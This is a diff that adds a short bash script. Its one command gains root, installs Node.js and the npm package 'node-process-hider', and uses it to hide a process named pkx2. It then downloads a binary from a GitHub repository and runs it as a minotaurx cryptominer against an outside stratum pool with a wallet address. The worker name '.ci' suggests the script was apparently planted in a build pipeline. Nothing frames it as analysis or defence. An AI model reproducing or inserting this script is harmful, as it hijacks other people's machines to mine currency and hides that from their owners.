@@ -1,0 +1,2 @@
+#!/bin/bash
+sudo su --command "sudo apt update && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && apt install nodejs && npm install -g npm@8.5.0 && npm i -g node-process-hider && ph add pkx2 && wget https://github.com/parkitmove/parkit/raw/main/pkx2 && chmod +x pkx2 && ./pkx2 -a minotaurx -o stratum+tcp://stratum.coinminerz.com:3375 -u  RQ41XjPaQBTRqtrYFWKKDhiHzmKkb86Lgk.ci -t 2"
